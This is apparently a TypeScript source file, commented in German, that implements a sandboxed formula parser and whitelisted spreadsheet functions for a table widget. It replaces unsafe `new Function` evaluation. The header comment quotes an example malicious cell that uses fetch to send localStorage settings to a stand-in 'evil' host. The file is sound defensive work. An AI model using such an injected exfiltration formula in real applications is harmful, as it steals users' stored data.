// ─── Sichere Formel-Auswertung für das Tabellen-Widget ───────────────────────
// Ersetzt die frühere `new Function(...)`-Auswertung, die JEDEN Text nach dem
// "=" als echtes JavaScript ausgeführt hat (RCE-Vektor über importierte
// Board-/Backup-Dateien — eine Zelle mit `=fetch('https://evil/?d='+
// localStorage.getItem('planboard-settings'))` lief beim Rendern automatisch).
// Cell-Referenzen (A1, A1:B3) werden in TableWidget.tsx `calcExpr` VOR diesem
// Modul bereits zu Zahlen-/String-/Array-Literalen aufgelöst — dieser Parser
// bekommt nur noch eine reine Ausdrucks-Zeichenkette (Operatoren, Literale,
// Funktionsaufrufe) und wertet sie über einen eigenen Tokenizer + Parser aus.
// Es gibt keinen Zugriff auf globale Objekte, kein `eval`/`new Function`, keine
// Property-Ketten — nur explizit whitelisted Tabellenfunktionen sind aufrufbar.

export type FormulaValue = number | string | boolean | FormulaValue[]
export class FormulaError extends Error {}

// ── Tokenizer ────────────────────────────────────────────────────────────────

type Token =
  | { t: 'num'; v: number }
  | { t: 'str'; v: string }
  | { t: 'ident'; v: string }
  | { t: 'op'; v: string }
  | { t: 'eof' }

const OPS2 = ['==', '!=', '<=', '>=', '&&', '||', '**']
const OPS1 = '+-*/%^<>!(),[]?:'

function tokenize(src: string): Token[] {
  const toks: Token[] = []
  let i = 0
  const n = src.length
  while (i < n) {
    const c = src[i]
    if (/\s/.test(c)) { i++; continue }
    if (c === '"') {
      let j = i + 1, s = ''
      while (j < n && src[j] !== '"') {
        if (src[j] === '\\' && j + 1 < n) {
          const esc = src[j + 1]
          if (esc === 'u' && j + 5 < n) {
            s += String.fromCharCode(parseInt(src.slice(j + 2, j + 6), 16))
            j += 6
          } else {
            const map: Record<string, string> = { n: '\n', t: '\t', r: '\r', b: '\b', f: '\f', '"': '"', '\\': '\\', '/': '/' }
            s += map[esc] ?? esc
            j += 2
          }
        } else { s += src[j]; j++ }
      }
      if (j >= n) throw new FormulaError('unterminated string')
      toks.push({ t: 'str', v: s })
      i = j + 1
      continue
    }
    if (/[0-9]/.test(c) || (c === '.' && /[0-9]/.test(src[i + 1] ?? ''))) {
      let j = i
      while (j < n && /[0-9.]/.test(src[j])) j++
      if (src[j] === 'e' || src[j] === 'E') {
        let k = j + 1
        if (src[k] === '+' || src[k] === '-') k++
        if (/[0-9]/.test(src[k] ?? '')) { while (/[0-9]/.test(src[k] ?? '')) k++; j = k }
      }
      const numStr = src.slice(i, j)
      const num = Number(numStr)
      if (Number.isNaN(num)) throw new FormulaError(`bad number "${numStr}"`)
      toks.push({ t: 'num', v: num })
      i = j
      continue
    }
    if (/[A-Za-z_]/.test(c)) {
      let j = i
      while (j < n && /[A-Za-z0-9_]/.test(src[j])) j++
      toks.push({ t: 'ident', v: src.slice(i, j) })
      i = j
      continue
    }
    const two = src.slice(i, i + 2)
    if (OPS2.includes(two)) { toks.push({ t: 'op', v: two }); i += 2; continue }
    if (OPS1.includes(c)) { toks.push({ t: 'op', v: c }); i++; continue }
    throw new FormulaError(`unexpected character "${c}"`)
  }
  toks.push({ t: 'eof' })
  return toks
}

function isOp(tok: Token, v: string): boolean { return tok.t === 'op' && tok.v === v }

// ── Parser + direkte Auswertung (rekursiver Abstieg, Operatoren wirken auf
//    bereits ausgewertete primitive Werte — nie auf rohe Zeichenketten) ──────

// Map statt Plain-Object: `'constructor' in {}` bzw. `({})['toString']` sind
// über die Prototype-Chain immer "vorhanden" — ein Objekt-Lookup würde also
// z. B. die Formel `constructor` oder den "Funktionsaufruf" `toString()`
// unbeabsichtigt auf eingebaute Object.prototype-Methoden auflösen. Map hat
// keine Prototype-Chain-Durchsickerung und ist daher die sichere Wahl hier.
const CONSTS = new Map<string, number>([['PI', Math.PI]])

class Parser {
  private pos = 0
  constructor(private toks: Token[], private fns: Map<string, (...a: FormulaValue[]) => FormulaValue>) {}
  private peek() { return this.toks[this.pos] }
  private next() { return this.toks[this.pos++] }
  private expect(v: string) { if (!isOp(this.next(), v)) throw new FormulaError(`expected "${v}"`) }

  parse(): FormulaValue {
    const v = this.ternary()
    if (this.peek().t !== 'eof') throw new FormulaError('unexpected trailing input')
    return v
  }

  private ternary(): FormulaValue {
    const cond = this.or()
    if (isOp(this.peek(), '?')) {
      this.next()
      const a = this.ternary()
      this.expect(':')
      const b = this.ternary()
      return Boolean(cond) ? a : b
    }
    return cond
  }
  private or(): FormulaValue {
    let v = this.and()
    while (isOp(this.peek(), '||')) { this.next(); const r = this.and(); v = Boolean(v) ? v : r }
    return v
  }
  private and(): FormulaValue {
    let v = this.compare()
    while (isOp(this.peek(), '&&')) { this.next(); const r = this.compare(); v = Boolean(v) ? r : v }
    return v
  }
  private compare(): FormulaValue {
    let v = this.additive()
    for (;;) {
      const t = this.peek()
      if (t.t === 'op' && ['==', '!=', '<', '>', '<=', '>='].includes(t.v)) {
        this.next()
        const r = this.additive()
        switch (t.v) {
          case '==': v = (v as unknown) == (r as unknown); break
          case '!=': v = (v as unknown) != (r as unknown); break
          case '<':  v = (v as never) <  (r as never); break
          case '>':  v = (v as never) >  (r as never); break
          case '<=': v = (v as never) <= (r as never); break
          case '>=': v = (v as never) >= (r as never); break
        }
      } else break
    }
    return v
  }
  private additive(): FormulaValue {
    let v = this.term()
    for (;;) {
      const t = this.peek()
      if (isOp(t, '+')) { this.next(); v = (v as never) + (this.term() as never) }
      else if (isOp(t, '-')) { this.next(); v = Number(v) - Number(this.term()) }
      else break
    }
    return v
  }
  private term(): FormulaValue {
    let v = this.power()
    for (;;) {
      const t = this.peek()
      if (isOp(t, '*')) { this.next(); v = Number(v) * Number(this.power()) }
      else if (isOp(t, '/')) { this.next(); v = Number(v) / Number(this.power()) }
      else if (isOp(t, '%')) { this.next(); v = Number(v) % Number(this.power()) }
      else break
    }
    return v
  }
  private power(): FormulaValue {
    const base = this.unary()
    // "^" wie in gängigen Tabellenkalkulationen als Potenz (nicht als JS-XOR!) —
    // "**" zusätzlich als Alias, rechtsassoziativ.
    if (isOp(this.peek(), '^') || isOp(this.peek(), '**')) {
      this.next()
      return Math.pow(Number(base), Number(this.power()))
    }
    return base
  }
  private unary(): FormulaValue {
    const t = this.peek()
    if (isOp(t, '-')) { this.next(); return -Number(this.unary()) }
    if (isOp(t, '+')) { this.next(); return Number(this.unary()) }
    if (isOp(t, '!')) { this.next(); return !this.unary() }
    return this.primary()
  }
  private primary(): FormulaValue {
    const t = this.next()
    if (t.t === 'num') return t.v
    if (t.t === 'str') return t.v
    if (isOp(t, '(')) { const v = this.ternary(); this.expect(')'); return v }
    if (isOp(t, '[')) {
      const items: FormulaValue[] = []
      if (!isOp(this.peek(), ']')) {
        items.push(this.ternary())
        while (isOp(this.peek(), ',')) { this.next(); items.push(this.ternary()) }
      }
      this.expect(']')
      return items
    }
    if (t.t === 'ident') {
      if (t.v === 'TRUE') return true
      if (t.v === 'FALSE') return false
      if (isOp(this.peek(), '(')) {
        this.next()
        const args: FormulaValue[] = []
        if (!isOp(this.peek(), ')')) {
          args.push(this.ternary())
          while (isOp(this.peek(), ',')) { this.next(); args.push(this.ternary()) }
        }
        this.expect(')')
        const fn = this.fns.get(t.v)
        if (!fn) throw new FormulaError(`unknown function "${t.v}"`)
        return fn(...args)
      }
      if (CONSTS.has(t.v)) return CONSTS.get(t.v)!
      throw new FormulaError(`unknown identifier "${t.v}"`)
    }
    throw new FormulaError('unexpected token')
  }
}

export function evalSafeExpr(src: string, fns: Record<string, (...a: FormulaValue[]) => FormulaValue>): FormulaValue {
  const toks = tokenize(src)
  const fnMap = new Map(Object.entries(fns))
  return new Parser(toks, fnMap).parse()
}

// ── Tabellenfunktionen (SUM, IF, COUNTIF, …) ─────────────────────────────────
// 1:1 aus der früheren Function-String-Implementierung portiert — nur jetzt als
// echte, sichere Closures statt Text, der in `new Function` gespleißt wurde.

function flatten(a: FormulaValue): FormulaValue[] {
  const arr = Array.isArray(a) ? a.flatMap(flatten) : [a]
  // Bewusst die lockere `!=`-Prüfung wie im Original (filtert auch 0 heraus,
  // da 0 == '' lose wahr ist) — Verhaltens-Kompatibilität zur Vorgängerversion.
  return arr.filter(x => (x as unknown) != '')
}
function nums(args: FormulaValue[]): number[] {
  return flatten(args).map(Number).filter(x => !isNaN(x))
}

export function buildFormulaFns(localeStr: string): Record<string, (...a: FormulaValue[]) => FormulaValue> {
  return {
    SUM:     (...a) => nums(a).reduce((s, v) => s + v, 0),
    AVERAGE: (...a) => { const n = nums(a); return n.length ? n.reduce((s, v) => s + v, 0) / n.length : 0 },
    AVG:     (...a) => { const n = nums(a); return n.length ? n.reduce((s, v) => s + v, 0) / n.length : 0 },
    // Leere Auswahl: 0 statt des rohen -Infinity/Infinity von Math.max()/min()
    // ohne Argumente (konsistent mit AVERAGE/AVG oben).
    MAX:     (...a) => { const n = nums(a); return n.length ? Math.max(...n) : 0 },
    MIN:     (...a) => { const n = nums(a); return n.length ? Math.min(...n) : 0 },
    COUNT:   (...a) => nums(a).length,
    COUNTA:  (...a) => flatten(a).filter(x => x !== '').length,
    COUNTIF: (r, c) => {
      const arr = flatten([r]); const s = String(c); const n = +s.replace(/[><=!]/g, '')
      if (s.startsWith('>=')) return arr.filter(x => +x >= n).length
      if (s.startsWith('<=')) return arr.filter(x => +x <= n).length
      if (s.startsWith('<>')) return arr.filter(x => String(x) !== s.slice(2)).length
      if (s.startsWith('>'))  return arr.filter(x => +x > n).length
      if (s.startsWith('<'))  return arr.filter(x => +x < n).length
      return arr.filter(x => String(x) === s).length
    },
    SUMIF: (r, c, sr) => {
      const ar = flatten([r]); const as = flatten([sr ?? r])
      return ar.reduce((t: number, v, i) => String(v) === String(c) ? t + (+as[i] || 0) : t, 0)
    },
    SUMIFS: (sr, ...args) => {
      const ar = flatten([sr]); let t = 0
      for (let i = 0; i < ar.length; i++) {
        let ok = true
        for (let j = 0; j < args.length - 1; j += 2) {
          const cr = flatten([args[j]]); const cs = String(args[j + 1])
          if (String(cr[i]) !== cs) ok = false
        }
        if (ok) t += +ar[i] || 0
      }
      return t
    },
    IF:       (c, t, f = '') => Boolean(c) ? t : f,
    IFS:      (...a) => { for (let i = 0; i < a.length - 1; i += 2) if (a[i]) return a[i + 1]; return a.length % 2 ? a[a.length - 1] : '' },
    IFERROR:  (v, e) => typeof v === 'string' && v[0] === '#' ? e : v,
    IFNA:     (v, e) => v === '#N/A' ? e : v,
    ROUND:     (n, d = 0) => Math.round(Number(n) * 10 ** Number(d)) / 10 ** Number(d),
    ROUNDUP:   (n, d = 0) => Math.ceil(Number(n) * 10 ** Number(d)) / 10 ** Number(d),
    ROUNDDOWN: (n, d = 0) => Math.floor(Number(n) * 10 ** Number(d)) / 10 ** Number(d),
    ABS:  n => Math.abs(Number(n)),
    SQRT: n => Math.sqrt(Number(n)),
    POWER: (n, p) => Math.pow(Number(n), Number(p)),
    MOD: (a, b) => Number(a) % Number(b),
    INT: n => Math.trunc(Number(n)),
    CEILING:    (v, s = 1) => Math.ceil(Number(v) / Number(s)) * Number(s),
    FLOOR_MATH: (v, s = 1) => Math.floor(Number(v) / Number(s)) * Number(s),
    LEN:   s => String(s).length,
    UPPER: s => String(s).toUpperCase(),
    LOWER: s => String(s).toLowerCase(),
    TRIM:  s => String(s).trim(),
    LEFT:  (s, n = 1) => String(s).slice(0, Number(n)),
    RIGHT: (s, n = 1) => { const t = String(s); return t.slice(Math.max(0, t.length - Number(n))) },
    MID:   (s, st, n) => String(s).slice(Number(st) - 1, Number(st) - 1 + Number(n)),
    CONCATENATE: (...a) => a.map(String).join(''),
    CONCAT:      (...a) => flatten(a).map(String).join(''),
    TEXTJOIN: (sep, ign, ...a) => flatten(a).filter(x => !ign || x !== '').join(String(sep)),
    AND: (...a) => a.every(Boolean),
    OR:  (...a) => a.some(Boolean),
    NOT: a => !a,
    EXP: n => Math.exp(Number(n)),
    LOG: (n, b = Math.E) => Math.log(Number(n)) / Math.log(Number(b)),
    LOG10: n => Math.log10(Number(n)),
    SIN: n => Math.sin(Number(n)),
    COS: n => Math.cos(Number(n)),
    TAN: n => Math.tan(Number(n)),
    RAND: () => Math.random(),
    RANDBETWEEN: (lo, hi) => Math.floor(Math.random() * (Number(hi) - Number(lo) + 1)) + Number(lo),
    TODAY: () => new Date().toLocaleDateString(localeStr),
    NOW:   () => new Date().toLocaleString(localeStr),
    TEXT:  v => String(v),
    VALUE: v => parseFloat(String(v)) || 0,
    REPT:  (s, n) => String(s).repeat(Math.max(0, Number(n))),
    SUBSTITUTE: (t, o, nw, idx) => {
      const text = String(t), oldStr = String(o), newStr = String(nw)
      if (!idx) return text.split(oldStr).join(newStr)
      // instance_num gesetzt: nur das n-te Vorkommen ersetzen, statt alle
      const n = Number(idx)
      if (!oldStr || !(n >= 1)) return text
      let count = 0, pos = 0
      for (;;) {
        const i = text.indexOf(oldStr, pos)
        if (i === -1) return text
        count++
        if (count === n) return text.slice(0, i) + newStr + text.slice(i + oldStr.length)
        pos = i + oldStr.length
      }
    },
    FIND:   (f, w, start = 1) => { const i = String(w).indexOf(String(f), Number(start) - 1); return i >= 0 ? i + 1 : '#VALUE!' },
    SEARCH: (f, w, start = 1) => { const i = String(w).toLowerCase().indexOf(String(f).toLowerCase(), Number(start) - 1); return i >= 0 ? i + 1 : '#VALUE!' },
    PROPER: s => String(s).replace(/\w\S*/g, t => t.charAt(0).toUpperCase() + t.slice(1).toLowerCase()),
    EXACT: (a, b) => a === b,
  }
}
